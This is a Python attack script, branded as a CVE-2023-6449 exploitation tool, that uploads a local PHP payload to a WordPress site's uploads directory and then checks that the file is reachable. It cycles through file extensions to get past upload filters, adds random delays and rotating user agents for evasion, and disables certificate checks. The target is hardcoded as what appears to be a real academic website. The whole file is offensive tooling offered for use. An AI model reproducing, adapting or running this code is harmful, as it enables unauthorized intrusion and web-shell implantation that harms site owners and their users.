import requests
import random
import string
import time
import os
from cryptography.fernet import Fernet
import urllib3

# Disable SSL warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────────────────────────────────────────
#  Project: CVE-2023-6449 Exploitation Tool by Charon
#  This tool uploads a PHP exploit file and attempts execution
#  Developed by: Charon | All rights reserved.
# ────────────────────────────────────────────────────────────────
print("""
                       (                             
                (      )\ )  *   )                   
                )\    (()/(` )  /(   (     )     )   
             ((((_)(   /(_))( )(_)) ))\ ( /(    (    
              )\ _ )\ (_)) (_(_()) /((_))(_))   )\  '
              (_)_\(_)| _ \|_   _|(_)) ((_)_  _((_)) 
               / _ \  |   /  | |  / -_)/ _` || '  \()
              /_/ \_\ |_|_\  |_|  \___|\__,_||_|_|_| 
 ---------------------------------------------------------------
                     Created by: ARTeam - All Rights to Charon
 ---------------------------------------------------------------
    """)

# Function to generate a random filename with a specific extension
def random_filename(extension=".php"):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + extension

# Setup encryption for activity logging
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Function to log encrypted activity data
def log_activity(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open("exploit_log.txt", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

# Introduce a random delay to requests for evasion
def random_delay():
    time.sleep(random.uniform(1, 5))

# Retry handler for handling network issues
def retry_request(func, retries=3):
    for attempt in range(retries):
        try:
            return func()
        except requests.exceptions.RequestException as e:
            log_activity(f"Attempt {attempt+1} failed: {e}")
            time.sleep(2)  # Delay before retrying
    print("All attempts failed.")
    return None

# Main function to upload the exploit file with different extensions
def upload_exploit_file(url, session, file_path):
    if not os.path.exists(file_path):
        print("File not found:", file_path)
        return
    
    extensions = [".php", ".html", ".txt", ".jpg", ".json", ".css", ".xml"]
    success = False
    
    for ext in extensions:
        file_name = random_filename(ext)
        with open(file_path, 'rb') as file:
            files = {'file': (file_name, file, 'application/octet-stream')}
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
            ]
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': url,
            }
            
            # Add a random delay before sending the request
            random_delay()
            
            # Retry mechanism for uploading the exploit file
            response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, verify=False))
            
            if response and response.status_code == 200:
                check_url = f"{url}/wp-content/uploads/{file_name}"
                log_activity(f"File uploaded successfully as {file_name}: {check_url}")
                print("File uploaded successfully as", file_name, ":", check_url)
                
                # Check if file is accessible
                check_response = session.get(check_url, verify=False)
                if check_response.status_code == 200:
                    print(f"File confirmed accessible at: {check_url}")
                    log_activity(f"File confirmed accessible at: {check_url}")
                    success = True
                    break
                else:
                    print(f"File not accessible after upload, status: {check_response.status_code}")
                    log_activity(f"File not accessible, might have been deleted or restricted.")
            else:
                log_activity(f"File upload failed for extension {ext}.")
                print("File upload failed for extension:", ext)

# ────────────────────────────────────────────────────────────────
#  Execution: Set target URL, initiate session, and run the exploit
# ────────────────────────────────────────────────────────────────

url = "https://oimt.ac.in"
session = requests.Session()
file_path = "/sec/root/charon_tool/313.php"
upload_exploit_file(url, session, file_path)
